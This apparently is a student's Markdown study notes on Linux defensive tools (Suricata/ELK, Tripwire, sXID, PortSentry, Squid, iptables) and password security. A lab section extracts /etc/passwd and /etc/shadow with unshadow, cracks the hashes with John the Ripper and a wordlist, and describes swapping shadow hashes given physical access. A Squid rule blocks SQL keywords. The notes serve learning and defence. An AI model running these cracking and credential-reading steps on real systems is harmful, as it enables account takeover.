---

## 🧠 Pro Tip

> Combine this rule-testing pipeline with **Kibana dashboards** and a **SIEM rule framework** to detect, visualize, and respond to threats efficiently.

---

## 📚 Further Reading

* 📘 [Suricata Rule Writing Guide](https://suricata.readthedocs.io/en/latest/rules/intro.html)
* 📘 [Snort Rule Basics](https://www.snort.org/documents)
* 🧪 [malware-traffic-analysis.net](https://www.malware-traffic-analysis.net/)
* 📊 [Elasticsearch SIEM](https://www.elastic.co/siem)

```

---

Would you like a **PDF export** of this chapter or integration into a larger online cybersecurity knowledge base?
```

---

## ⚙️ **NIDS Light – Lightweight Sensor for Rule Generation**

NIDS Light is an intrusion detection sensor that helps generate rules and monitor traffic in a lightweight manner. It integrates with Suricata for rule-based alerts.

**Installation**:

* NIDS Light can be installed on the same server as Suricata or on a separate monitoring node.
* Rules are created based on **traffic patterns**, and suspicious events are logged for analysis.

---

## 📊 **Using Kibana to Visualize Suricata Alerts**

Once Suricata is running and Filebeat is shipping the logs, you can use Kibana to visualize the alerts.

1. **Access Kibana** via the browser:

   ```plaintext
   http://localhost:5601
   ```

2. **Set up Index Patterns** in Kibana:

   * Go to **Management > Index Patterns**.
   * Create an index pattern `suricata-alerts-*`.

3. **Create Dashboards**:

   * Go to **Dashboard > Create New Dashboard**.
   * Add visualizations (such as **pie charts**, **bar graphs**, and **time series** data) to analyze Suricata alerts, network traffic anomalies, and intrusion detection statistics.

---

## 🔐 **Security Monitoring with ELK SIEM**

Elasticsearch with Kibana provides powerful features for **Security Information and Event Management (SIEM)**:

* **Alerting**: Set up thresholds to trigger alerts for certain types of traffic, intrusions, or anomalies.
* **Anomaly Detection**: Use machine learning-based detection models to automatically identify suspicious patterns in network traffic.

> 🧠 **Note**: **SIEM** will leverage both **Suricata's logs** and **NIDS Light alerts** for a comprehensive threat detection and monitoring system.

---

## 🚀 **Conclusion**

By combining **Suricata** for **Full Packet Capture (FPC)**, **Filebeat** for log shipping, and **ELK Stack** for storage, analysis, and visualization, you create a **robust and scalable NIDS/IDS solution**.

> ✅ **Monitoring**: With this setup, you can continuously monitor network traffic for anomalies, intrusions, and other suspicious activities.
> ✅ **Alerting & SIEM**: Using Elasticsearch and Kibana, you can efficiently process, store, and visualize security events in real-time.

With **NIDS Light**, you also gain **lightweight rule generation** capabilities to adapt to new threats without significant overhead.

> ✨ **Next Steps**:
>
> 1. Fine-tune Suricata rules to reduce false positives.
> 2. Build customized Kibana dashboards for better security monitoring visibility.
> 3. Integrate **Threat Intelligence feeds** to enhance detection accuracy.

---

## 🔗 **Additional Resources**

* 📘 [Suricata Official Documentation](https://suricata.io/docs/)
* 📦 [Filebeat Installation Guide](https://www.elastic.co/guide/en/beats/filebeat/current/filebeat-installation.html)
* 🧠 [ELK Stack Overview](https://www.elastic.co/what-is/elk-stack)
* 🔍 [Kibana Dashboards Tutorial](https://www.elastic.co/guide/en/kibana/current/tutorial-dashboard.html)
* 🛡️ [NIDS Light Sensor Information](https://www.nids-light.org/)

```

---

This Markdown guide should now serve as a **complete reference** for setting up a **full Suricata + ELK Stack integration** with **Filebeat** and **NIDS Light** for centralized security monitoring, analysis, and alerting.

Feel free to modify or expand this for additional setup details, depending on your environment or toolset.
```

___

## SECURITY ONION ##


___

# Defensive Security Tools #

## file permissions ##
Not accisble by default user.

```bash
nano /etc/shadow
```
output:
```txt
[ Error reading /etc/shadow: Permission denied ]
```

Accessible by default user:
```bash
nano /etc/passwd 
```
output:
```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
Accisble by default user.
```

Special permissions allows all users to run
```bash
passwd
```

## ATTACK on S-bit creating a service to escalate to root privileges ## 

and change password because a service running (runs with ROOT privileges) momentarily provides temprorary root access to the user to change the password.

Find files:
```bash
sudo find /usr -perm -4000
```
```bash
sudo find /usr -perm -4000 - exec ls -l {} \;
```

Important for success:
chaning the s-bit
```bash
chmod u+s somefile.txt
```
```bash
chmod 4755 somefile.txt
```

### sXID package monito to SUID ###

install sxid package.

configure in the /etc/sxid.conf

```bash
nano /etc/sxid.conf
```
- remember email


### TRIPWIRE ###

Intruder in system will change critical 

Checks hashes of the most important sysadmin files to periodically checks for any modifications by comparing hahses.

### PortSentry ###

Guard over ports. 
Look at packets and modify firewall rules to prevent attacks.
EXAMPLE:Firewall can be realtime updated to update firewall rules.
EXAMPLE:🗺️ also to make another picture of the real setup (honeypot🍯) "lie" about the ports (ghosts ports).

#### 🔺 Can be misused for denial of service 🔺 ####


### Squid Proxy ###

A web🕸️ proxy

HTTP, HTTPS, FTP, SSL, TLS,...
Forwarding and caching for performance.
Filtering traffic based on application.


### Shorewall ###

Interface for making iptables (for GUI purposes). 
Gateway with multiple functions/interfaces (often 3) (DMZ's).

___
## sXID Excercices ##

```bashx
sudo apt-get install sxid
```
**configure the /etc/sxid.conf**
```txt
Enter a valid emailto send reportto. (optional)
```
```txt
Set the KEEP_LOGS to keepa numberof old logs.
```
```txt
Set the SEARCH to bethe list of directoriesor files you want to search for SUID/GUID changes.
```
```txt
–Add the critical dirs with commands.
```
```txt
–Add also a test directory to be protected. Test chmod +s
```

___
## sXID Exercises ##

### Install `sxid`
```bash
sudo apt-get install sxid
````

### Configure `/etc/sxid.conf`

Edit the configuration file to define how `sxid` behaves. Open the file:

```bash
sudo nano /etc/sxid.conf
```

Make the following changes:

* **Set report email (optional):**

  ```txt
  EMAIL="your_email@example.com"
  ```

* **Set number of log backups:**

  ```txt
  KEEP_LOGS=5
  ```

* **Define which paths to monitor:**

  ```txt
  SEARCH="/bin /sbin /usr/bin /usr/sbin /your/test/dir"
  ```

* **Add critical directories manually:**

  ```bash
  mkdir rocku
  sudo chmod +s rocku
  ```

### Run sxid manually

```bash
sudo sxid -v
```

### Schedule sxid to run every hour

Edit crontab:

```bash
sudo crontab -e
```

Add this line:

```cron
0 * * * * /usr/sbin/sxid -q
```
>- 0 * * * * – This means the command will run at the top of every hour (i.e.,
>- minute 0 of each hour).
/usr/sbin/sxid -q – This is the command being run. It's executing sxid with the -q option.

---

## Exercise 12.b – Tripwire

### Install Tripwire

```bash
sudo apt-get install tripwire
```

### Initialize configuration

Set the passphrase when prompted.

### Edit `/etc/tripwire/twpol.txt` to define protected directories

Example:

```bash
(
  rulename = "System binaries",
  severity = 100
)
{
  /bin -> $(SEC_CRIT);
  /sbin -> $(SEC_CRIT);
  /etc -> $(SEC_CRIT);
}
```

### Create site and local keys

```bash
sudo twadmin --generate-keys
```

### Initialize the Tripwire database

```bash
sudo tripwire --init
```

### Test Tripwire

1. Create a new file in `/bin`:

   ```bash
   sudo touch /bin/evil
   ```

2. Run Tripwire check:

   ```bash
   sudo tripwire --check
   ```

### Schedule Tripwire in crontab

```bash
sudo crontab -e
```

Add:

```cron
*/20 * * * * /usr/sbin/tripwire --check
```

---

## Exercise 12.c – PortSentry

### Install PortSentry

```bash
sudo apt-get install portsentry
```

### Edit `/etc/portsentry/portsentry.conf`

* **Protect common ports from scans:**

  ```txt
  TCP_PORTS="1,7,9,11,13,15,17,19,20,21,22,23,25,37,42,43,53,69,79,80,110,111"
  UDP_PORTS="1,7,9,69,161,162"
  ```

* **Add fake ports to monitor non-existing ones.**

* **Uncomment iptables integration to block scans:**

  ```txt
  KILL_ROUTE="/sbin/iptables -I INPUT -s $TARGET$ -j DROP"
  ```

### Run PortSentry and test with Nmap from another machine

```bash
sudo systemctl restart portsentry
```

Example Nmap command from another machine:

```bash
nmap -sS <target-IP>
```

Check logs:

```bash
cat /var/log/syslog | grep portsentry
```

---

## Exercise 12.d – Squid Proxy

### Install Squid Proxy

```bash
sudo apt-get install squid
```

### Edit Squid config file

```bash
sudo nano /etc/squid/squid.conf
```

Add filters:

* **Block countries by domain suffix:**

  ```squid
  acl blocked_domains dstdomain .se .ru .ch
  http_access deny blocked_domains
  ```

* **Block by content keywords:**

  ```squid
  acl block_keywords url_regex -i "Sverige" "Sweden" "drop table" "insert"
  http_access deny block_keywords
  ```

### Restart Squid

```bash
sudo systemctl restart squid
```

### Configure browser to use proxy and test filters

---

## Exercise 12.e – Shorewall (Optional)

### Install Shorewall

```bash
sudo apt-get install shorewall
```

### Setup Shorewall zones

Define `zones` file:

```txt
# ZONE   TYPE
fw       firewall
net      ipv4
dmz      ipv4
loc      ipv4
```

### Define interfaces in `interfaces`:

```txt
#ZONE  INTERFACE  BROADCAST
net    eth0       detect
dmz    eth1       detect
loc    eth2       detect
```

### Setup routing rules in `policy`:

```txt
#SOURCE  DEST    POLICY
loc      net     ACCEPT
loc      dmz     ACCEPT
dmz      loc     DROP
net      dmz     ACCEPT
net      loc     DROP
```

### Start Shorewall

```bash
sudo systemctl restart shorewall
```

Ensure Apache and mail servers are only accessible according to rules.

---


___


## Tripwire Excercises ##



## PortSentry (Port Guardian) Excercise ##


## Squid Proxy ##
## Tripwire ##
## Shorewall ##

___

## 
___

## Cracking Passwords with John The Ripper ##
> VM MACHINES: | ATTACKER: KALI Linux | TARGET: Ubuntu |
___
> Exract and merge the passwd and shadow files with John The Ripper unshadow

check files content: 
```bash
sudo cat /etc/passwd | wc -l
sudo cat /etc/shadow | wc -l

```
check if there exists any hashed passwords:
```bash
sudo grep -v '!*' /etc/shadow | grep -v '::'
```
Insert a hashed password by adding a user: 

```bash
sudo useradd -m testuser
sudo passwd testuser
```
then run 
```bash
sudo unshadow /etc/passwd /etc/shadow > unshadow.txt
```
___
```bash
sudo grep -v '^[^:]*:[!*]' /etc/shadow
```

```txt
john:$y$j9T$rSdngTR2tSKGmIekfOwke.$fwOSdb20vj4BXDxXCFFKlQ.5JyA.P4dz774tb8rDUG4:20206:0:99999:7:::
testuser:$y$j9T$jrDQrNby/p0W8zXTaFISS.$ViEzxfX0DjsJUkhfk5b/3mOctkvXRx8f8s6sTTPUCL1:20213:0:99999:7:::
```

___
THIS COMMANDS CRACKS THE PASSWORDS IN 🗃️UNSHADOW.txt with corresponding wordlist 🔐./10-million-passwords.txt
```bash
sudo john --format=crypt  --wordlist=./10-million-passwords.txt  /etc/unshadow.txt
```
output:
```txt
┌──(john㉿john)-[~/h4cker/cracking_passwords/more_wordlists]
└─$ sudo john --format=crypt  --wordlist=./10-million-passwords.txt  /etc/unshadow.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
test             (testuser)     
test             (john)     
2g 0:00:00:01 DONE (2025-05-05 04:56) 1.092g/s 104.9p/s 209.8c/s 209.8C/s austin..miller
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Check the cracking result:
```bash
sudo john --show /etc/unshadow.txt
```
output:
```txt
┌──(john㉿john)-[~/h4cker/cracking_passwords/more_wordlists]
└─$ sudo john --show /etc/unshadow.txt

john:<HERE SHOULD BE PLAIN TEXT PASSWORD>:1000:1000:john,,,:/home/john:/usr/bin/zsh
testuser:<HERE SHOULD BE PLAIN TEXT PASSWORD>:1001:1001::/home/testuser:/bin/sh

2 password hashes cracked, 0 left
```                                    
___

```bash
sudo apt-get install build-essential libssl-dev zlib1g-dev
```



[Wordlists](https://github.com/The-Art-of-Hacking/h4cker/tree/master/cracking_passwords/more_wordlists)

```bash
git clone https://github.com/The-Art-of-Hacking/h4cker.git
```

```bash
cd h4cker/cracking_passwords/more_wordlists
```

```bash
sudo john --wordlist=/10-million-passwords.txt /etc/unshadow.txt
```

``
___

### IPTABLES : HOW TO ###

>Allow all trafficon the loopback interface
Command:
```bash
ip a | grep inet
```
Output:
``` 
 inet 127.0.0.1/8 scope host lo
```
Command:
```bash
sudo iptables -A INPUT -m --source 172.0.0.1/24 -j ACCEPT
sudo iptables -L -v
```
Output:
```
Chain INPUT (policy ACCEPT 2291 packets, 160K bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 ACCEPT     all  --  any    any     172-0-0-0.lightspeed.brhmal.sbcglobal.net/24  anywhere            

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
```
___
> Allow inbound traffic related to outbound connections
Command:
```bash
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
```
Output:
```
Chain INPUT (policy ACCEPT 2788 packets, 196K bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 ACCEPT     all  --  any    any     172-0-0-0.lightspeed.brhmal.sbcglobal.net/24  anywhere            
  245 17212 ACCEPT     all  --  any    any     anywhere             anywhere             ctstate RELATED,ESTABLISHED

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination 
```
___
> Allow ICMP packets of type 3, 8 and 11
Command:
```bash
sudo iptables -A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT
sudo iptables -A INPUT -p icmp -m icmp --icmp-type 3 -j ACCEPT
sudo iptables -A INPUT -p icmp -m icmp --icmp-type 11 -j ACCEPT
sudo iptables -L -v
```
Output:
```
Chain INPUT (policy ACCEPT 2922 packets, 209K bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 ACCEPT     all  --  any    any     172-0-0-0.lightspeed.brhmal.sbcglobal.net/24  anywhere            
10307  761K ACCEPT     all  --  any    any     anywhere             anywhere             ctstate RELATED,ESTABLISHED
    0     0 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp echo-request
    0     0 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp destination-unreachable
    0     0 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp time-exceeded

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

```
___
> Make a new filter chain called ALLOWED and add it to the INPUT filter chain
🔻Command (if issues with the '-N' then replace '-' in the terminal:
```bash
sudo iptables –N ALLOWED1
sudo iptables –A INPUT –j ALLOWED1
sudo iptables -L -v
```
We added:
```
Chain ALLOWED (1 references)
 pkts bytes target     prot opt in     out     source               destination
```
Output:
```
Chain INPUT (policy ACCEPT 2923 packets, 209K bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 ACCEPT     all  --  any    any     172-0-0-0.lightspeed.brhmal.sbcglobal.net/24  anywhere            
19415 1402K ACCEPT     all  --  any    any     anywhere             anywhere             ctstate RELATED,ESTABLISHED
    0     0 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp echo-request
    0     0 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp destination-unreachable
    0     0 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp time-exceeded
    0     0 ALLOWED    all  --  any    any     anywhere             anywhere            

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain ALLOWED (1 references)
 pkts bytes target     prot opt in     out     source               destination 
```
___
> In the new filter chain ALLOWED add reachable service
>  •SSH, HTTP, HTTPS

Command:
```bash
sudo iptables -A ALLOWED -p tcp --destination-port 22 -j ACCEPT
sudo iptables -A ALLOWED -p tcp --destination-port 80 -j ACCEPT
sudo iptables -A ALLOWED -p tcp --destination-port 443 -j ACCEPT
sudo iptables -L -v
```
Obeserve change:
```
Chain ALLOWED (1 references)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:ssh
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:http
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:https
```

Output:
```
Chain INPUT (policy ACCEPT 2927 packets, 209K bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 ACCEPT     all  --  any    any     172-0-0-0.lightspeed.brhmal.sbcglobal.net/24  anywhere            
23462 1688K ACCEPT     all  --  any    any     anywhere             anywhere             ctstate RELATED,ESTABLISHED
    0     0 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp echo-request
    0     0 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp destination-unreachable
    0     0 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp time-exceeded
    4   333 ALLOWED    all  --  any    any     anywhere             anywhere            

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain ALLOWED (1 references)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:ssh
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:http
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:https
```

___
> Add a rule allowing all traffic from localnet ip addresses to acces port range 2000-4723

Command:
```bash
sudo iptables -A INPUT -p tcp  --match multiport --dports 2000:4723 --source 192.168.249.1/24 -j ACCEPT
sudo iptables -L -v
```
Obeserve change:
```
    0     0 ACCEPT     tcp  --  any    any     192.168.249.0/24     anywhere             multiport dports 2000:4723

```

Output:
```txt
Chain INPUT (policy ACCEPT 2929 packets, 209K bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 ACCEPT     all  --  any    any     172-0-0-0.lightspeed.brhmal.sbcglobal.net/24  anywhere            
28358 2035K ACCEPT     all  --  any    any     anywhere             anywhere             ctstate RELATED,ESTABLISHED
    0     0 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp echo-request
    0     0 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp destination-unreachable
    0     0 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp time-exceeded
    6   508 ALLOWED    all  --  any    any     anywhere             anywhere            
    0     0 ACCEPT     tcp  --  any    any     192.168.249.0/24     anywhere             multiport dports 2000:4723

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain ALLOWED (1 references)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:ssh
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:http
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:https

```
## 🔺 APPEND DROP ALL RULE TO THE CHAIN 🔺 ## 
```bash
sudo iptables -A INPUT -j DROP
```

```txt
 4   324 DROP       all  --  any    any     anywhere             anywhere        
```

```bash
sudo iptables -L -v
```

```txt
Chain INPUT (policy ACCEPT 4557 packets, 350K bytes)
 pkts bytes target     prot opt in     out     source               destination    
    0     0 ACCEPT     all  --  any    any     172.0.0.0/24         anywhere            
81984   31M ACCEPT     all  --  any    any     anywhere             anywhere             ctstate RELATED,ESTABLISHED
    0     0 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp echo-request
    0     0 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp destination-unreachable
    0     0 ACCEPT     icmp --  any    any     anywhere             anywhere             icmp time-exceeded
 1642  142K ALLOWED    all  --  any    any     anywhere             anywhere            
    0     0 ACCEPT     tcp  --  any    any     192.168.249.0/24     anywhere             multiport dports 1024:3000
    4   324 DROP       all  --  any    any     anywhere             anywhere            

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain ALLOWED (1 references)
 pkts bytes target     prot opt in     out     source               destination         
    4   256 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:ssh
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:http
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:https
```






___

Firwalls implemented on each host system via iptables are a very cost effective way to control and filter out unwanted traffic.

Not only implementing packet filtering mechanism in a network architecture through Firewalls implemented on the communication lines, but also on each host machine system will allow for more secure means of communication.

This also adheares to principle of [defence in depth](https://en.wikipedia.org/wiki/Defense_in_depth_(computing)). [Military  Defenc in depth](https://en.wikipedia.org/wiki/Defence_in_depth)

___

## [FIREWALL](https://en.wikipedia.org/wiki/Firewall_(computing)#Packet_filter) ###

**A PACKET FILTER**
A set of rules that want's to control what packets go in and out.
Throw out 

[IPTABLES](https://en.wikipedia.org/wiki/Iptables)
[IP FIREWALLS](https://en.wikipedia.org/wiki/Ipfirewall)
[COMPARE FIREWALLS](https://en.wikipedia.org/wiki/Comparison_of_firewalls)

[Berkely Packet Filter](https://en.wikipedia.org/wiki/Berkeley_Packet_Filter)
___


## Chains ##

Set a chain with a purpose: 
We can insert subchains in the iptables main 3 chains  INPUT, FORWARD, OUTPUT.



___

Server with economic system and database (seperated). 
Can protect databases from remote access.
Granular access

___

Ensure to boot with execute IP rules for saving rules with shutdown and apply rules when boot.

USE VERBOSE 
```bash
sudo iptables -L -v
```

> alice@alice: /etc/netplan$
```bash
sudo iptables -S
```
>-P INPUT ACCEPT
>-P FORWARD ACCEPT
>-P OUTPUT ACCEPT


```bash
sudo iptables -L
```
>Chain INPUT (policy ACCEPT)       target     prot opt source               destination         Chain FORWARD (policy ACCEPT)  target     prot opt source               destination Chain OUTPUT (policy ACCEPT) target     prot opt source               destination 
___

Append rule at the end of chain:
```bash
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
```

| -m = module (can help about what happend prior to packet (n) | conntrack (list of standard services that uses more than one port)  (stateful inspection) | -- ctstate | ESTABLISHED,RELATED (BASED ON 3-way handshake) Packets not established from inside are dropped, i allow responses from the established connection from internal host RELATED = if protocol uses more n>1 more than 1 protocols for the service | j = jump | ACCEPT / DROP|

Allow anywhere tcp 
```bash
sudo iptables -A INPUT -p TCP --dport 22 -j ACCEPT
```
Allow only specific ip address:
```bash
sudo iptables -A INPUT -p TCP --dport 22 --source 192.168.249.1/24 -j ACCEPT
```
Delete chain rule 2
```bash
sudo iptables -D INPUT 2
```

For redundany:
LOOPBACK important for services performance (most packets must be first in the chain for performance tuning)
```bash
sudo iptables -I INPUT 1 -i lo -j ACCEPT
```



___


[Look at ip address lookup](https://www.cyberciti.biz/faq/bash-shell-command-to-find-get-ip-address/)

```bash
lsfw
```
```bash
ip addr
```
```bash
ifconfig
```

```bash
netstat -4 -r -n
```
___

*Gateway ip*

```bash
ip route 
```

[Manial configure Netplan IP/TCP](https://netplan.readthedocs.io/en/latest/netplan-yaml/)
___


## Authentication ## 

Password [HIVE: Brute Force table risk](https://www.hivesystems.com/blog/are-your-passwords-in-the-green)

Read NIST's view on [authenticators](https://pages.nist.gov/800-63-3-Implementation-Resources/63B/Authenticators/) 

Shared secret ( we know something mutaual) 

Imaging a battlefield -> if soldiers have to pass they should know the mutual shared secret to not be shot down if approcing friendly lines back from scouting. 

In todays digital world this is a bit problematic. 

Why is this not suitable:

- this is something we know and this is easy to steal or guess

Other options? 

- something we have is better

Back in the days, we could rip off a dollar ticket and the two pieces will onyl match and this can verify and authenticate.

We categories this as another methode of verification:
- This is more unique and authenticate
- But will be more costly to implement than a password (or something we know)


Biometric authentication: 
- This is another methode of verification


## [Authentication](https://en.wikipedia.org/wiki/Authentication) depends on the weakes link ## 


3 methodes:
        - What you know (passwords)
        - What you have(dongle, smartcard, certficate, phone,...)
        - What you are(biometrics, height, voice, walk dynamics,...)


Danish solution *NemID* (outfaced)
An authentication methode implemented often via keys on a physical card with 50 keys.
        - Implementation : you get a number and must find the correspending key on the physical card. 
🔺RISKS : 
        - People take pictures of the physical card and coudl share it.
        
Other solutions to keys:
        - With a dongle 


CURRENT danish authentication:
        - app on phone


Password managers any more secure, well a breach to lastpass occured: 

[lastpass breach](https://blog.lastpass.com/posts/notice-of-recent-security-incident)


___

## Weakness of passwords ##

**Password reuse**
**Writing down passwords**
**Weak system in password creation** 

For fun only:
[Statistics on passwords](https://explodingtopics.com/blog/password-stats)
___

## Educate users when setting up passwords  ##

- Tell the user if it is to easy to implement the password
- Check and compare reuse of passwords from databases

___

Middleware Software also default passwords
- Databases ( MySQL, LDAP, MS, Oracle,...) Web servers, Web shop templates.
- CRM, economic system

## PROCEDURE Checklist: 

- Check password
- Delete original admin account
- document admin account credentials (for all systems all devices)
- ask people for passwords (what are your passwords)
- research passwords on social media ( Men chooses : hobbies, football clubs | Women : Chooses emotional topics, family names, interests)
- try online guessing
- hashes brute forcing / download hashes and bruteforce passwords
- Do not store passwords in clear text
- use ***[key derevative](https://csrc.nist.gov/csrc/media/Projects/crypto-publication-review-project/documents/initial-comments/sp800-132-initial-public-comments-2023.pdf)*** hashing functions like Argon2 also look at my [explenation of hashing](https://orskoven.github.io/orskov.github.io/#use-key-derivative-functions-for-password-storage)
- use salt and peber ( user database is salt and password (then you save peber someware else))  

___


```bash
nmap
```
Look for gateway (look for dhcp) 
```bash
PORTS  STATE  SERVICE REASON  
22/tcp  open   ssh     syn-ack
                dhcp
```
Enter the following ip address in browser
```bash
192.168.0.1 
```
Then search for deault password on the web to pass login page. 

___

### Practical password ###

🖥️ on linux let's look at the password hashing storing in linux ubuntu system.
Hashes and plaintext are stored seperately for permission granularity. 

```bash
john:$y$salt$hash
```
| $ | Seperator | 
| salt | before hash value / makes rainbowtable useless (will cost the attacker on CPU or and TIME) | 

```bash
cat /etc/passwd
```
```bash
cat /etc/shadow
```
___



Accessing the data maliciosly 

**Remeber to encrypt disk** 

Scenario : 
> BOOT with your own disk inserted to a host (extenal usb)
> The system should open with permission for the usb inserted.  
> Next: the attack should overwrite the /etc/passwd file

This would occur to user:
> if password is not corretly written in login
> user will be prompted and cause is the attacker in scenario before

___

### GUIDE : ###
🔺 Only with physical access and non encrypted disk 🔺 

Booting with permission and priviliges to external usb inserted

Imagine BOB (current admin)  ALICE(hacker)


```bash
sudo adduser alice
```
```bash
password123
```
Enter Information 
and access hashed password file:
```bash
sudo cat /etc/shadow 
```
in editing mode in the file 
swap two password hashes
(for learning: you should know both passwords) 
now with the hash swap you can login in with the other users password. 


KALI: 

| john the ripper | linux passwords | make total bruteforce random | check minimum length(people adjust based on minimal requirements) |   


Resarch: 

Password lists based on language. 

___

Attackers will use ***social engineering*** to collect intelligence on your most common words and other related subjects in your online presence. 
___

How are you making yourself more secure? 

Blackbox test. 
Whitebox test.

___

### Password Defence ### 

Strong password policy🔺
- opensource compiled manager - research / sandbox / compile yourself
- require longer passwords
- require uppercase lowercase numbers special characters
- limit password validity 60 or 90 days
- consuder system generated passwords
- use some password manager
- periodic cracking of company users passwords for "simple passwords"
- no reuse of userid & password across service
- add location and time limitations for login
- add second or third factor of authentication
  > combine with out of band info, one-time pw, tokens 


___

> sys admin tools often provide hacking stuff for forgotten passwords 


___


```bash

adduser user1
echo 5 chars
echo dog
adduser user2
echo 8 chars
echo doggydog
adduser user3
echo long english word
echo londonbridg
```

___

## [John The Ripper](https://en.wikipedia.org/wiki/John_the_Ripper) ##

___

### Online Tool for Password Cracking ### 
___

## [Sec Tools Passwd cracking](https://sectools.org/tag/pass-audit/) ## 
___



___
-Intercepting traffic
-Needs certificates for https and sslsplit
-Social engineering kit

DNS spoof

___
### MANDATORY SOF_ELK ###

Download the nf2sof.sh
```bash
wget http://www.kallas.dk/nf2sof.sh ; sudo chmod +x nf2sof.sh
```
output:
```
--2025-05-02 12:29:26--  http://www.kallas.dk/nf2sof.sh
Resolving www.kallas.dk (www.kallas.dk)... 165.232.77.195
Connecting to www.kallas.dk (www.kallas.dk)|165.232.77.195|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5066 (4.9K) [text/x-sh]
Saving to: ‘nf2sof.sh’

nf2sof.sh      0%       0  --.-KB/s        nf2sof.sh    100%   4.95K  --.-KB/s    in 0s      

2025-05-02 12:29:26 (43.1 MB/s) - ‘nf2sof.sh’ saved [5066/5066]

```
create an empty file called my_netflow.txt
```bash
nano my_netflow.txt
```
depending on your ip (insert your sof-elk ip) run the commmand to transfer the netflow folder with the help from just downloaded nf2sof.sh file
```bash
 ./nf2sof.sh -e 192.168.251.130 -r ./netflow -w ./my_netflow.txt
```

output:
```
./nf2sof.sh -e 192.168.251.130 -r ./netflow -w ./my_netflow.txt
WARNING: Output file location is not in /logstash/nfarch/. Resulting file will
         not be automatically ingested unless moved/copied to the correct
         filesystem location.
         Press Ctrl-C to try again or <Enter> to continue.

Running distillation.  Putting output in /Users/john/Downloads/my_netflow.txt

Text file creation complete.
You must move/copy the generated file to the /logstash/nfarch/ directory before
  SOF-ELK can process it.


```

```bash
scp my_netflow.txt  elk_user@192.168.251.130:/logstash/nfarch/
```
output:
```
my_netfl 100%   20MB  42.5MB/s   00:00  

```

## in Sof-elk kibana gui ##

filter search in the top
```
netflow.tcp_flags_str.keyword :"........" 
```
___

## Forensics ##

When correlating data, we can with benefit use SOF-ELK. 

